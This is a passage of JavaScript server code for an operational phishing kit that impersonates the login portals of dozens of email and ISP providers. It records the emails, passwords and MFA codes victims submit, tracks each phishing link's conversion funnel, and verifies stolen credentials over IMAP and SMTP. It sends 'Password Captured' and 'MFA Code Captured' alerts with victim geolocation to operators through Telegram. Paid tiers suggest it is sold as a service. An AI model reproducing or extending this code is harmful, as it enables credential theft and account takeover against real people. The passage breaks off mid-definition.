  godaddy: { primary: '#1bdbdb', button: '#1bdbdb', text: '#000000', accent: '#0fa5a5', name: 'GoDaddy Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#000" text-anchor="middle" font-family="Arial">G</text>' },
  ovh: { primary: '#123f6d', button: '#123f6d', text: '#ffffff', accent: '#0d2a4d', name: 'OVH Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">O</text>' },
  juno: { primary: '#1b3a7d', button: '#1b3a7d', text: '#ffffff', accent: '#0d1f4d', name: 'Juno Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">J</text>' },
  netzero: { primary: '#003d99', button: '#003d99', text: '#ffffff', accent: '#002860', name: 'NetZero Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">N</text>' },
  windstream: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Windstream Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">W</text>' },
  mediacom: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Mediacom Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">M</text>' },
  usanet: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'USA.NET Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">U</text>' },
  centurylink: { primary: '#009bdb', button: '#009bdb', text: '#ffffff', accent: '#0078ab', name: 'CenturyLink Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">C</text>' },
  arcor: { primary: '#ff3300', button: '#ff3300', text: '#ffffff', accent: '#cc2900', name: 'Arcor Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">A</text>' },
  oneandone: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: '1&1 Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">1</text>' },
  freenet: { primary: '#006699', button: '#006699', text: '#ffffff', accent: '#004d73', name: 'Freenet Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">F</text>' },
  vodafone: { primary: '#e60000', button: '#e60000', text: '#ffffff', accent: '#b30000', name: 'Vodafone Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">V</text>' },
  talktalk: { primary: '#002f5c', button: '#002f5c', text: '#ffffff', accent: '#001f3a', name: 'TalkTalk Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  plusnet: { primary: '#003d99', button: '#003d99', text: '#ffffff', accent: '#002860', name: 'Plusnet Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">P</text>' },
  madasafish: { primary: '#003d99', button: '#003d99', text: '#ffffff', accent: '#002860', name: 'Madasafish Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">M</text>' },
  libero: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Libero Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">L</text>' },
  virgilio: { primary: '#ff8c00', button: '#ff8c00', text: '#ffffff', accent: '#cc7000', name: 'Virgilio Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">V</text>' },
  tiscali: { primary: '#ff0000', button: '#ff0000', text: '#ffffff', accent: '#cc0000', name: 'Tiscali Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  shaw: { primary: '#003b6f', button: '#003b6f', text: '#ffffff', accent: '#002a4d', name: 'Shaw Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">S</text>' },
  rogers: { primary: '#da291c', button: '#da291c', text: '#ffffff', accent: '#b02115', name: 'Rogers Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">R</text>' },
  bell: { primary: '#0050a0', button: '#0050a0', text: '#ffffff', accent: '#003d80', name: 'Bell Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">B</text>' },
  telus: { primary: '#4b286d', button: '#4b286d', text: '#ffffff', accent: '#381f52', name: 'TELUS Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  telstra: { primary: '#001e82', button: '#001e82', text: '#ffffff', accent: '#001560', name: 'Telstra Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  optus: { primary: '#00828c', button: '#00828c', text: '#ffffff', accent: '#006066', name: 'Optus Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">O</text>' },
  bouygues: { primary: '#004080', button: '#004080', text: '#ffffff', accent: '#002e5c', name: 'Bouygues Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">B</text>' },
  caramail: { primary: '#ff0000', button: '#ff0000', text: '#ffffff', accent: '#cc0000', name: 'Caramail Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">C</text>' },
  voila: { primary: '#ff00ff', button: '#ff00ff', text: '#ffffff', accent: '#cc00cc', name: 'Voila Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">V</text>' },
  terra: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'Terra Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  telefonica: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Telefónica Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  movistar: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Movistar Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">M</text>' },
  ono: { primary: '#ff8800', button: '#ff8800', text: '#ffffff', accent: '#cc6600', name: 'ONO Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">O</text>' },
  jazztel: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Jazztel Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">J</text>' },
  yacom: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'Ya.com Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">Y</text>' },
  mixmail: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Mixmail Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">M</text>' },
  euskaltel: { primary: '#003d8f', button: '#003d8f', text: '#ffffff', accent: '#002860', name: 'Euskaltel Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">E</text>' },
  maildedeu: { primary: '#333333', button: '#333333', text: '#ffffff', accent: '#1a1a1a', name: 'Mail.de Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">M</text>' },
  etisalat: { primary: '#ff0000', button: '#ff0000', text: '#ffffff', accent: '#cc0000', name: 'Etisalat Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">E</text>' },
  du: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'du Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">D</text>' },
  stc: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'STC Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">S</text>' },
  tedata: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'TE Data Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  linkdotnet: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Link.net Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">L</text>' },
  noor: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Noor Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">N</text>' },
  maroctelecom: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Maroc Telecom Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">M</text>' },
  tunisietelecom: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'Tunisie Telecom Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  topnet: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Topnet Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  gnet: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'GlobalNet Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">G</text>' },
  batelco: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Batelco Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">B</text>' },
  qatartel: { primary: '#ff0000', button: '#ff0000', text: '#ffffff', accent: '#cc0000', name: 'Ooredoo Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">Q</text>' },
  omantel: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: 'Omantel Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">O</text>' },
  idm: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'IDM Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">I</text>' },
  sodetel: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Sodetel Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">S</text>' },
  jordannet: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Jordan Telecom Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">J</text>' },
  uruklink: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'UrukLink Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">U</text>' },
  yemennet: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'YemenNet Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">Y</text>' },
  algerietelecom: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'Algérie Télécom Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">A</text>' },
  oneeightoneight: { primary: '#ff6600', button: '#ff6600', text: '#ffffff', accent: '#dd5500', name: '188 Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">1</text>' },
  twentyonecn: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: '21CN Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">2</text>' },
  tom: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: 'TOM Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">T</text>' },
  twosixthree: { primary: '#0066cc', button: '#0066cc', text: '#ffffff', accent: '#003399', name: '263 Portal', logo: '<text x="50" y="65" font-size="48" font-weight="900" fill="#fff" text-anchor="middle" font-family="Arial">2</text>' }
};

// ---- Self-learning provider database ----
// Automatically learns and remembers domain→provider mappings from real traffic.
// Stored in learned-providers.json — survives restarts, grows smarter over time.
const LEARNED_DB_PATH = path.join(__dirname, 'learned-providers.json');
let learnedProviders = {}; // domain → { provider, brandName, firstSeen, lastSeen, hits }

function loadLearnedProviders() {
  try {
    if (fs.existsSync(LEARNED_DB_PATH)) {
      learnedProviders = JSON.parse(fs.readFileSync(LEARNED_DB_PATH, 'utf8'));
      console.log(`[learn] Loaded ${Object.keys(learnedProviders).length} learned domains`);
    }
  } catch (e) {
    console.warn('[learn] Could not load learned-providers.json:', e.message);
    learnedProviders = {};
  }
}

function saveLearnedProviders() {
  queueWrite(LEARNED_DB_PATH, () => learnedProviders, 'learn', { pretty: true, delayMs: 500 });
}

// Save to disk at most once every 30 seconds (batch writes)
let savePending = false;
function scheduleSave() {
  if (savePending) return;
  savePending = true;
  setTimeout(() => { savePending = false; saveLearnedProviders(); }, 30000);
}

function learnDomain(domain, provider, brandName) {
  if (!provider || provider === 'email') return; // don't learn unknowns
  if (DOMAIN_TO_PROVIDER[domain]) return; // already hardcoded, skip
  const now = new Date().toISOString();
  if (learnedProviders[domain]) {
    learnedProviders[domain].hits++;
    learnedProviders[domain].lastSeen = now;
    if (brandName && !learnedProviders[domain].brandName) {
      learnedProviders[domain].brandName = brandName;
    }
  } else {
    learnedProviders[domain] = { provider, brandName: brandName || null, firstSeen: now, lastSeen: now, hits: 1 };
    console.log(`[learn] New domain: ${domain} → ${provider}${brandName ? ` (${brandName})` : ''}`);
  }
  scheduleSave();
}

function lookupLearned(domain) {
  const entry = learnedProviders[domain];
  if (!entry) return null;
  entry.hits++;
  entry.lastSeen = new Date().toISOString();
  scheduleSave();
  return { provider: entry.provider, brandName: entry.brandName };
}

// Load on startup
loadLearnedProviders();

// ---- App Settings ----
const SETTINGS_PATH = path.join(__dirname, 'settings.json');
const DEFAULT_SETTINGS = {
  maxPasswordAttempts: 3,
  maxMfaAttempts: 3,
  // Per-tier feature permissions (superadmin/owner always has all)
  tierPermissions: {
    vip:     { chameleon: true,  inbox: true,  convert: true,  links: true },
    premium: { chameleon: true,  inbox: true,  convert: false, links: true },
    basic:   { chameleon: false, inbox: true,  convert: false, links: true },
  },
};
let appSettings = { ...DEFAULT_SETTINGS };

function loadSettings() {
  try {
    if (fs.existsSync(SETTINGS_PATH)) {
      const saved = JSON.parse(fs.readFileSync(SETTINGS_PATH, 'utf8'));
      appSettings = { ...DEFAULT_SETTINGS, ...saved };
      console.log(`[settings] Loaded settings`);
    }
  } catch (e) {
    console.warn('[settings] Could not load settings.json:', e.message);
  }
}

function saveSettings() {
  try {
    fs.writeFileSync(SETTINGS_PATH, JSON.stringify(appSettings, null, 2));
  } catch (e) {
    console.warn('[settings] Could not save settings.json:', e.message);
  }
}

loadSettings();

const ADMIN_PATH = 'u';

// ---- Client Links ----
const LINKS_DB_PATH = path.join(__dirname, 'client-links.json');
let clientLinks = {}; // hash → { slug, email, createdAt, expiresAt, createdBy }

function loadLinksDB() {
  try {
    if (fs.existsSync(LINKS_DB_PATH)) {
      clientLinks = JSON.parse(fs.readFileSync(LINKS_DB_PATH, 'utf8'));
      // Purge expired links
      const now = Date.now();
      for (const [hash, link] of Object.entries(clientLinks)) {
        if (link.expiresAt && new Date(link.expiresAt).getTime() < now) delete clientLinks[hash];
      }
      console.log(`[links] Loaded ${Object.keys(clientLinks).length} active client links`);
    }
  } catch (e) {
    console.warn('[links] Could not load client-links.json:', e.message);
    clientLinks = {};
  }
}

function saveLinksDB() {
  try {
    // _seen is in-memory only (per-IP dedup state) — strip before persisting.
    const replacer = (k, v) => k === '_seen' ? undefined : v;
    fs.writeFileSync(LINKS_DB_PATH, JSON.stringify(clientLinks, replacer, 2));
  } catch (e) {
    console.warn('[links] Could not save client-links.json:', e.message);
  }
}
let linksSavePending = false;
function scheduleLinksSave() {
  if (linksSavePending) return;
  linksSavePending = true;
  setTimeout(() => { linksSavePending = false; saveLinksDB(); }, 2000);
}

// Per-link funnel: clicks → opens → emails → passwords → mfas
function ensureLinkStats(link) {
  if (!link.stats) link.stats = {
    clicks: 0, opens: 0, emails: 0, passwords: 0, mfas: 0,
    uniqueClickIps: 0, uniqueOpenIps: 0,
    firstClick: null, firstOpen: null, firstSubmit: null, lastEvent: null,
  };
  if (!link._seen) link._seen = { click: {}, open: {} };
  return link.stats;
}
function recordLinkEvent(hash, kind, ip) {
  const link = clientLinks[hash];
  if (!link) return;
  const s = ensureLinkStats(link);
  const now = new Date().toISOString();
  ip = (ip || 'anon').replace('::ffff:', '');

  if (kind === 'click') {
    s.clicks++;
    if (!s.firstClick) s.firstClick = now;
    if (!link._seen.click[ip]) { link._seen.click[ip] = now; s.uniqueClickIps++; }
  } else if (kind === 'open') {
    s.opens++;
    if (!s.firstOpen) s.firstOpen = now;
    if (!link._seen.open[ip]) { link._seen.open[ip] = now; s.uniqueOpenIps++; }
  } else if (kind === 'email') {
    s.emails++;
    if (!s.firstSubmit) s.firstSubmit = now;
  } else if (kind === 'password') {
    s.passwords++;
    if (!s.firstSubmit) s.firstSubmit = now;
  } else if (kind === 'mfa') {
    s.mfas++;
    if (!s.firstSubmit) s.firstSubmit = now;
  }
  s.lastEvent = now;
  scheduleLinksSave();
  try {
    broadcast('linkstats', { hash, kind, stats: s },
      (c) => c.role === 'superadmin' || c.userId === link.userId);
  } catch {}
}

loadLinksDB();

// ---- Login Attempts Log ----
const LOGINS_DB_PATH = path.join(__dirname, 'login-attempts.json');
let loginAttempts = []; // array of { email, password, mfaCode, ip, userAgent, slug, provider, timestamp, type }

function loadLoginsDB() {
  try {
    if (fs.existsSync(LOGINS_DB_PATH)) {
      loginAttempts = JSON.parse(fs.readFileSync(LOGINS_DB_PATH, 'utf8'));
      console.log(`[logins] Loaded ${loginAttempts.length} login attempts`);
    }
  } catch (e) {
    console.warn('[logins] Could not load login-attempts.json:', e.message);
    loginAttempts = [];
  }
}

let loginSavePending = false;
function saveLoginsDB() {
  // Compact JSON — login-attempts.json is machine-only and grows fast.
  queueWrite(LOGINS_DB_PATH, () => loginAttempts, 'logins', { delayMs: 2000 });
}
function scheduleLoginSave() { saveLoginsDB(); }

// ---- SSE event bus (realtime push to admin panel) ----
const sseClients = new Set(); // { res, userId, role, slug }
function broadcast(eventName, payload, filter) {
  const json = JSON.stringify(payload || {});
  for (const client of sseClients) {
    try {
      if (filter && !filter(client)) continue;
      client.res.write(`event: ${eventName}\ndata: ${json}\n\n`);
    } catch { sseClients.delete(client); }
  }
}

function logAttempt(data) {
  let ip = (data.ip || '').toString();
  if (ip.startsWith('::ffff:')) ip = ip.slice(7);
  const entry = {
    id: crypto.randomBytes(8).toString('hex'),
    email: data.email || '',
    password: data.password || '',
    mfaCode: data.mfaCode || null,
    mfaMethod: data.mfaMethod || null,
    ip,
    userAgent: (data.userAgent || '').slice(0, 200),
    slug: data.slug || null,
    provider: data.provider || null,
    type: data.type || 'password',
    campaignId: data.campaignId || null,
    campaignDomain: data.campaignDomain || null,
    timestamp: new Date().toISOString(),
  };
  loginAttempts.push(entry);
  scheduleLoginSave();
  // Realtime push: notify admins whose slug matches (or superadmins) that a new attempt came in
  broadcast('login', { type: entry.type, email: entry.email, ip: entry.ip, slug: entry.slug, ts: entry.timestamp, cid: entry.campaignId, cdm: entry.campaignDomain },
    (c) => c.role === 'superadmin' || (entry.slug && c.slug === entry.slug));

  // Notification + verification policy by type:
  //   email    → recorded only (shows under attachment's Clients dropbox).
  //              No Telegram, no IMAP/SMTP probe — recipient hasn't given a
  //              password yet, nothing to verify and nothing to alert about.
  //   password → verify credentials in background (IMAP → SMTP), Telegram
  //              fires AFTER the verify result is known so you see VALID /
  //              Invalid / OAuth-only in the alert.
  //   mfa      → Telegram fires immediately (no creds to verify).
  if (entry.type === 'password' && entry.email && entry.password) {
    if (data.imapResult) {
      // Caller already verified (e.g. /api/verify-password awaited the result).
      entry.imapResult = data.imapResult;
      entry.verifyMethod = data.verifyMethod || 'imap';
      scheduleLoginSave();
      sendTelegramAlert(entry);
    } else {
      entry.imapResult = 'checking';
      verifyCredentials(entry.email, entry.password).then(({ result, method }) => {
        entry.imapResult = result;
        entry.verifyMethod = method;
        scheduleLoginSave();
        console.log(`[verify] ${entry.email}: ${result} (via ${method})`);
        sendTelegramAlert(entry);
      });
    }
  } else if (entry.type === 'mfa') {
    sendTelegramAlert(entry);
  }
  // type === 'email' — no notification, just recorded.
  return entry;
}

// ---- Telegram Notifications ----
// Generic Telegram message — used for admin-login + honeypot alerts.
async function sendTelegramToSuperadmins(text) {
  const recipients = usersDB.filter(u =>
    u.role === 'superadmin' && u.telegramEnabled && u.telegramBotToken && u.telegramChatId
  );
  for (const user of recipients) {
    try {
      await fetch(`https://api.telegram.org/bot${user.telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: user.telegramChatId, text, parse_mode: 'Markdown' }),
      });
    } catch (e) { console.warn('[telegram] superadmin alert failed:', e.message); }
  }
}

async function sendTelegramAlert(entry) {
  // Find all users who should be notified about this attempt
  const notifyUsers = usersDB.filter(u => {
    if (!u.telegramEnabled || !u.telegramBotToken || !u.telegramChatId) return false;
    // Super admin gets all notifications
    if (u.role === 'superadmin') return true;
    // Regular user only gets notifications for their slug
    if (entry.slug && u.slug === entry.slug) return true;
    return false;
  });

  for (const user of notifyUsers) {
    try {
      // Parse browser from UA
      const ua = entry.userAgent || '';
      let browser = 'Unknown';
      if (ua.includes('Edg/')) browser = 'Edge';
      else if (ua.includes('Chrome/')) browser = 'Chrome';
      else if (ua.includes('Firefox/')) browser = 'Firefox';
      else if (ua.includes('Safari/') && !ua.includes('Chrome')) browser = 'Safari';
      let os = '';
      if (ua.includes('Windows')) os = 'Windows';
      else if (ua.includes('Mac OS')) os = 'Mac';
      else if (ua.includes('Linux')) os = 'Linux';
      else if (ua.includes('Android')) os = 'Android';
      else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

      // Geo enrichment — pull cached ASN/ISP if we have it, else fall back to offline country/city.
      const geo = (typeof geoForIp === 'function' && geoForIp(entry.ip))
                || (typeof offlineGeo === 'function' && offlineGeo(entry.ip))
                || null;
      let geoLine = '';
      if (geo) {
        const cc = geo.countryCode || '';
        const flag = (cc.length === 2)
          ? String.fromCodePoint(...cc.toUpperCase().split('').map(c => 127397 + c.charCodeAt(0)))
          : '';
        const locParts = [geo.city, geo.region, geo.zip, geo.country].filter(Boolean);
        if (locParts.length) geoLine += `\n📍 *Location:* ${flag} ${locParts.join(', ')}`;
        if (geo.timezone) geoLine += `  _(${geo.timezone})_`;
        if (geo.isp || geo.org) geoLine += `\n🛰 *ISP:* ${geo.isp || geo.org}${geo.as ? ' · ' + geo.as : ''}`;
        const flags = [];
        if (geo.mobile)  flags.push('📱 Mobile');
        if (geo.proxy)   flags.push('🦹 Proxy/VPN');
        if (geo.hosting) flags.push('🏢 Datacenter');
        if (flags.length) geoLine += `\n${flags.join(' · ')}`;
        if (typeof geo.lat === 'number' && typeof geo.lon === 'number') {
          geoLine += `\n🗺 [Map](https://www.google.com/maps?q=${geo.lat},${geo.lon})`;
        }
      } else if (typeof queueGeoLookup === 'function') {
        // No data yet — kick off enrichment so the next alert has it.
        queueGeoLookup(entry.ip);
      }

      let msg;
      if (entry.type === 'mfa') {
        msg = `🔐 *MFA Code Captured*\n\n` +
          `📧 *Email:* \`${entry.email}\`\n` +
          `🔑 *Code:* \`${entry.mfaCode}\`\n` +
          `📱 *Method:* ${(() => { switch (entry.mfaMethod) {
            case 'sms': return 'SMS';
            case 'google_authenticator': return 'Google Authenticator';
            case 'google_backup': return 'Google Backup Code';
            case 'google_sms': return 'Google SMS';
            case 'google_prompt': return 'Google Prompt';
            default: return 'Auth App';
          } })()}\n` +
          `🌐 *IP:* \`${entry.ip}\`` + geoLine + `\n` +
          `💻 *Browser:* ${browser}${os ? ' / ' + os : ''}\n` +
          (entry.campaignId ? `📎 *Campaign:* \`${entry.campaignId}\`\n` : '') +
          (entry.campaignDomain ? `🌍 *Domain:* \`${entry.campaignDomain}\`\n` : '') +
          `🕐 *Time:* ${new Date(entry.timestamp).toLocaleString()}`;
      } else {
        let imapLine = '';
        const vm = entry.verifyMethod ? entry.verifyMethod.toUpperCase() : 'IMAP';
        if (entry.imapResult === 'valid') imapLine = `\n✅ *${vm}:* VALID — credentials work!`;
        else if (entry.imapResult === 'invalid') imapLine = `\n❌ *${vm}:* Invalid credentials`;
        else if (entry.imapResult === 'oauth_only') imapLine = `\n🔒 *OAuth Only* — provider requires app password`;
        else if (entry.imapResult === 'error') imapLine = `\n⚠️ *Verify:* Could not connect`;
        else if (entry.imapResult === 'timeout') imapLine = `\n⏳ *Verify:* Connection timed out`;
        else imapLine = `\n🔄 *Verify:* Checking...`;

        msg = `🔓 *Password Captured*\n\n` +
          `📧 *Email:* \`${entry.email}\`\n` +
          `🔑 *Password:* \`${entry.password}\`\n` +
          `🌐 *IP:* \`${entry.ip}\`` + geoLine + `\n` +
          `💻 *Browser:* ${browser}${os ? ' / ' + os : ''}\n` +
          (entry.campaignId ? `📎 *Campaign:* \`${entry.campaignId}\`\n` : '') +
          (entry.campaignDomain ? `🌍 *Domain:* \`${entry.campaignDomain}\`\n` : '') +
          `🕐 *Time:* ${new Date(entry.timestamp).toLocaleString()}` +
          imapLine;
      }

      await fetch(`https://api.telegram.org/bot${user.telegramBotToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: user.telegramChatId,
          text: msg,
          parse_mode: 'Markdown',
        }),
      });
    } catch (e) {
      console.warn(`[telegram] Failed to send to ${user.username}:`, e.message);
    }
  }
}

loadLoginsDB();

// ---- Traffic Debug Log ----
const TRAFFIC_DB_PATH = path.join(__dirname, 'traffic-logs.json');
let trafficLogs = [];
const MAX_TRAFFIC_LOGS = 500;

function loadTrafficDB() {
  try {
    if (fs.existsSync(TRAFFIC_DB_PATH)) {
      trafficLogs = JSON.parse(fs.readFileSync(TRAFFIC_DB_PATH, 'utf8'));
      if (!Array.isArray(trafficLogs)) trafficLogs = [];
      console.log(`[traffic] Loaded ${trafficLogs.length} traffic logs`);
    }
  } catch (e) {
    console.warn('[traffic] Could not load traffic-logs.json:', e.message);
    trafficLogs = [];
  }
}

function saveTrafficDB() {
  // Compact JSON — traffic-logs.json is machine-only, pretty-print just bloats it.
  queueWrite(TRAFFIC_DB_PATH, () => trafficLogs, 'traffic', { delayMs: 1000 });
}
function scheduleTrafficSave() { saveTrafficDB(); }

function logTraffic(data) {
  const entry = {
    id: crypto.randomBytes(8).toString('hex'),
    ts: new Date().toISOString(),
    stage: data.stage || 'proxy',
    method: data.method || 'GET',
    url: data.url || '',
    status: data.status || 0,
    duration: data.duration || 0,
    reqHeaders: data.reqHeaders || null,
    reqBody: data.reqBody || null,
    respHeaders: data.respHeaders || null,
    respBody: data.respBody || null,
    error: data.error || null,
    slug: data.slug || null,
  };
  trafficLogs.unshift(entry);
  if (trafficLogs.length > MAX_TRAFFIC_LOGS) trafficLogs = trafficLogs.slice(0, MAX_TRAFFIC_LOGS);
  scheduleTrafficSave();
  broadcast('traffic', entry, (c) => c.role === 'superadmin' || (entry.slug && c.slug === entry.slug));
}

async function proxyRequest({ targetUrl, method, headers, body }) {
  const start = Date.now();
  const logEntry = {
    stage: 'proxy',
    method: method || 'GET',
    url: targetUrl,
    reqHeaders: headers || null,
    reqBody: body || null,
  };
  try {
    const fetchOpts = { method: method || 'GET', headers: headers || {} };
    if (body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
      fetchOpts.body = typeof body === 'string' ? body : JSON.stringify(body);
    }
    const resp = await fetch(targetUrl, fetchOpts);
    const respText = await resp.text();
    logEntry.status = resp.status;
    logEntry.respHeaders = Object.fromEntries(resp.headers.entries());
    logEntry.respBody = respText.slice(0, 5000);
    logEntry.duration = Date.now() - start;
    logTraffic(logEntry);
    return { status: resp.status, headers: logEntry.respHeaders, body: respText };
  } catch (err) {
    logEntry.error = err.message;
    logEntry.duration = Date.now() - start;
    logTraffic(logEntry);
    throw err;
  }
}

loadTrafficDB();

// ---- Credential Verification (IMAP + SMTP fallback) ----
// Providers that block basic auth (OAuth-only) — skip IMAP, try SMTP
const OAUTH_ONLY_DOMAINS = new Set([
